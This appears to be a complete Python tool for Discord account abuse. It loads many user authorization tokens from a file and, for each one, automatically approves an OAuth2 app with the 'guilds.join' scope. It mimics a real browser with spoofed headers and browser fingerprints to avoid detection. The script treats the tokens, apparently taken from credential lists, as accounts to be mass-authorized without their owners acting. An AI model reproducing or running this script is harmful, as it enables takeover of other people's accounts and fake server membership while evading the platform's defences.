from curl_cffi import requests
import os
from helpers.config import values
from helpers.header import ua_builder
from helpers.log import *
from time import perf_counter
from helpers.session import create_session
def clear_terminal():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")
    
def load_tokens():
    tokens = []

    with open('token.txt', 'r') as f:
        for line in f:
            line = line.strip()

            if line:
                if ':' in line:
                    token = line.split(':')[-1]
                else:
                    token = line

                tokens.append(token)

    return tokens

tokens = load_tokens()
def config():
    ua = values().ua()
    client_id = values().client_id()
    redirect_url=values().auth_url()
    return ua,client_id,redirect_url
ua,client_id,redirect_url=config()

def header_builder(token):
    headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': token,
    'cache-control': 'no-cache',
    'content-type': 'application/json',
    'origin': 'https://discord.com',
    'pragma': 'no-cache',
    'priority': 'u=1, i',
    'referer': f'https://discord.com/oauth2/authorize?client_id={client_id}&redirect_uri={redirect_url}',
    'sec-ch-ua': ua_builder(ua).sec_ch_ua(),
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': ua_builder(ua).sec_ch_ua_platform(),
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'sec-gpc': '1',
    'user-agent': ua,
    'x-debug-options': 'bugReporterEnabled',
    'x-discord-locale': 'en-US',
    'x-discord-timezone': 'Asia/Karachi',
    'x-installation-id': ua_builder(ua).installation_id(),
    'x-super-properties': ua_builder(ua).sup_prop(),
}
    return headers
def adder(token,session):
    
    headers = header_builder(token)
    params = (
        ('client_id', client_id),
        ('response_type', 'code'),
        ('redirect_uri', 'http://localhost:5000/callback'),
        ('scope', 'identify guilds.join'),
    )
    data = '{"permissions":"0","authorize":true,"integration_type":0,"location_context":{"guild_id":"10000","channel_id":"10000","channel_type":10000}}' # just hardcoded for now replace with ur own, or just get with discord.py stuff
    response = session.post('https://discord.com/api/v9/oauth2/authorize', headers=headers, params=params,data=data)
    return response
def main():
    clear_terminal()
    stars= "*" * 45
    for token in tokens:
        session = create_session()
        start = perf_counter()
        response=adder(token,session)
        took = perf_counter() - start
        if response.status_code == 200:
                result = response.json()
                location = result.get("location")

                if location:
                    r = session.get(location)

                    if r.status_code == 200:
                        success(f"{r.text}, status_code={r.status_code} | token={token[:34]}{stars}, took={took:.2f}s")
                        #info(r.text)
                    else:
                        error(r.text)
                        error(str(r.status_code))
        else:
                error(response.text)
                error(str(response.status_code))


if __name__ == "__main__":
    main()
